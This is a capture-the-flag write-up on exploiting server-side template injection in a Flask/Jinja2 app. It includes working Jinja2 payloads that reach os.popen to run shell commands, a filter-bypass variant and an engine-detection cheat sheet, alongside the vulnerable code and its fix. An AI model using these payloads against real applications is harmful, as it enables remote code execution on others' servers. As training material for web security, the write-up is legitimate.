---
title: "Web - Server-Side Template Injection"
description: "Exploiting a Jinja2 SSTI vulnerability in a Flask app to achieve remote code execution and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Medium             |
| Points     | 300                |
| Flag       | `zemi{t3mpl4t3_1nj3ct10n_p0p}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-ssti/app.py)
- [flag.txt](/Website/challenges/web-ssti/flag.txt)
- [README.md](/Website/challenges/web-ssti/README.md)
- [requirements.txt](/Website/challenges/web-ssti/requirements.txt)

## Reconnaissance

The challenge is a Flask web app at `http://challenge.ctf.local:7070` with a "greeting card" feature. You enter your name and it displays:

```
Hello, YourName! Welcome to our site.
```

Let's test if our input is being processed by a template engine:

```
Name: {{ 7*7 }}
```

Output:

```
Hello, 49! Welcome to our site.
```

The server evaluated `7*7`. This is Server-Side Template Injection (SSTI). Since it's a Flask app, the template engine is almost certainly Jinja2.

## Confirming Jinja2

```
Name: {{ config }}
```

Output:

```
Hello, <Config {'DEBUG': False, 'SECRET_KEY': '...', ...}>! Welcome to our site.
```

Confirmed — we can access Flask's config object. This is Jinja2 SSTI.

## Exploitation

### Step 1: Read the flag file

The classic Jinja2 SSTI payload to read files:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This dumps all subclasses — too noisy. Let's go straight for file reading. In Jinja2, we can use the `cycler` object to access `os`:

```
{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
```

Output:

```
Hello, zemi{t3mpl4t3_1nj3ct10n_p0p}! Welcome to our site.
```

### Alternative Payloads

If `cycler` doesn't work, try other Jinja2 globals:

```jinja2
{# Using joiner #}
{{ joiner.__init__.__globals__.os.popen('id').read() }}

{# Using namespace #}
{{ namespace.__init__.__globals__.os.popen('ls').read() }}

{# Direct subclass traversal #}
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read() }}
  {% endif %}
{% endfor %}
```

If `_` (underscore) is blocked:

```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag.txt')|attr('read')() }}
```

## The Vulnerable Code

The backend likely does something like:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet', methods=['POST'])
def greet():
    name = request.form.get('name')
    # VULNERABLE: user input in template string
    template = f"Hello, {name}! Welcome to our site."
    return render_template_string(template)
```

The fix — never put user input inside the template string:

```python
@app.route('/greet', methods=['POST'])
def greet():
    name = request.form.get('name')
    # SAFE: user input passed as a variable
    return render_template_string("Hello, {{ name }}! Welcome.", name=name)
```

## SSTI Detection Cheat Sheet

Test these payloads to identify the template engine:

| Payload | Jinja2 | Mako | Twig | Freemarker |
|---------|--------|------|------|------------|
| `{{7*7}}` | 49 | 49 | 49 | 49 |
| `{{7*'7'}}` | 7777777 | 7777777 | 49 | Error |
| `<%= 7*7 %>` | Error | Error | Error | Error |
| `${7*7}` | Error | 49 | Error | 49 |

## Tools Used

- Browser / curl
- [SSTImap](https://github.com/vladko312/SSTImap) — automated SSTI detection and exploitation
- Burp Suite — request interception and modification

## Lessons Learned

- **Never** concatenate user input into template strings
- Pass user data as template variables instead
- SSTI can lead to full Remote Code Execution (RCE)
- Different template engines have different exploitation techniques
- Test with `{{7*7}}` as a quick SSTI check — if it returns `49`, you have injection
- Use a Web Application Firewall (WAF) as defense-in-depth, but don't rely on it as the sole protection
